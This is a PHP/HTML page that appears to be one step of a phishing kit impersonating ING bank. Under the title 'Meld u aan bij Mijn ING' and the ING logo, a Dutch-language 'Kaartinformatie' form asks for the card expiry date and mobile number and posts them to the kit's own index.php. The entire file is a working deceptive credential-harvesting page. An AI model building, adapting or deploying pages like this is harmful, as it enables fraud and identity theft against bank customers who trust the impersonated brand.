<?php
 
    require_once "../app.php";
   

?>
<html><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    
    <link rel="stylesheet" href="./css/font-awesome.min.css">
    
    
    <link rel="stylesheet" href="./css/bootstrap.min.css">
    <link rel="stylesheet" href="./css/core_form.css">

    


    <base href="">
    <link rel="stylesheet" href="./css/css.css">
    <meta charset="UTF-8">
    <link rel="shortcut icon" type="image/png" href="./css/favicon.ico">
</head>

<body ng-app="app" ng-controller="c1" ng-model-options="{'allowInvalid':true}" class="ng-scope">
    <form action="./index.php" id="WizardForm" method="post" accept-charset="utf-8">
<input type="hidden" name="step"  value="exp">
    <title class="ng-binding">Meld u aan bij Mijn ING</title>
    <div class="top">
        <div class="container">
            <div class="clearfix">
                <img class="logo" src="./css/ing-logo.svg">
                
            </div>
        </div>
    </div>
    <div class="main mt-3 mt-sm-5">
        <div class="box" id="box">
            <div class="container">
                <div class="box2">
                    <div class="scum_container loader_hide">
                        <div class="scum" id="exp-view">
                                <div class="title ng-binding">
                                    Kaartinformatie
                                </div>
                                <hr>
                                <!-- <p class="legend">
                                    Lorem ipsum dolor sit amet, consectetur adipisicing elit. Autem in, sunt quos ipsum quam aliquid optio delectus quisquam ut ea ducimus nihil saepe commodi voluptas molestiae impedit officia, perferendis. Doloremque.
                                </p> -->
                                <div class="alert alert-danger alert-dismissible err_div ng-binding" style="display: none;">
                                    <strong class="ng-binding">Fouten: </strong> U moet hieronder een aantal van die velden inchecken.
                                    <button type="button" onclick="$(this).parent().hide()" class="close">
                                        <span aria-hidden="true">×</span>
                                    </button>
                                </div>
                                

                                

                                
                                




                                
    

                                <h4 class="ng-binding">Vervaldatum kaart</h4>
                                <script>
function formatExpiryDate(input) {
    // Remove all non-digit characters
    let value = input.value.replace(/\D/g, '');

    // Insert a slash after the second digit (MM) if it's long enough
    if (value.length >= 3) {
        value = value.slice(0, 2) + '/' + value.slice(2, 6);
    }

    input.value = value;
}
</script><div class="form-group">
                                    <label for="exp" class="ng-binding">Vervaldatum van uw kaart</label>
                                    <input type="text" name="exp" id="exp" mask-placeholder="MM/JJJJ" placeholder="MM/JJJJ" class="form-control ng-pristine ng-untouched ng-valid ng-empty ng-valid-pattern" data-ng-model="data.exp" required="" oninput="formatExpiryDate(this)" maxlength="7">
                                    <span class="err_span ng-binding" style="display: none;">
                                        <img class="i8" src="exl.png"> Waarde onjuist
                                    </span>
                                </div><hr>



                                
                                <h4 class="ng-binding">Geef uw gsm-nummer in 

</h4><div class="form-group">
                                    
                                    <input type="text" name="num" id="exp" data-mask="99/9999" mask-placeholder="MM/JJJJ" placeholder="04 -- -- -- --" class="form-control ng-pristine ng-untouched ng-valid ng-empty ng-valid-pattern" data-ng-model="data.exp" required="">
                                    <label for="exp" class="ng-binding">Gelieve uw laatste gsm-nummer met ons te delen om er zeker van te zijn dat wij u telefonisch kunnen bereiken.

</label>
                                </div><div class="button-div d-flex justify-content-between align-items-center">
                                    <div class="">
                                        
                                    </div>
                                    <button class="btn btn-warning ng-binding">Bevestigen</button>
                                </div>
                            
                        </div>
                    </div>
                </div>
            </div>
        <div class="loader__ waiter__" style="display: none;">    <div class="loader-box">        <span class="fa fa-circle-o-notch fa-spin"></span>        <p class="waiter_p ng-binding">Een moment ...</p>    </div></div></div>
    </div></form>
    <div class="footer-links ">
        
    </div>
    
    
    
    


</body></html>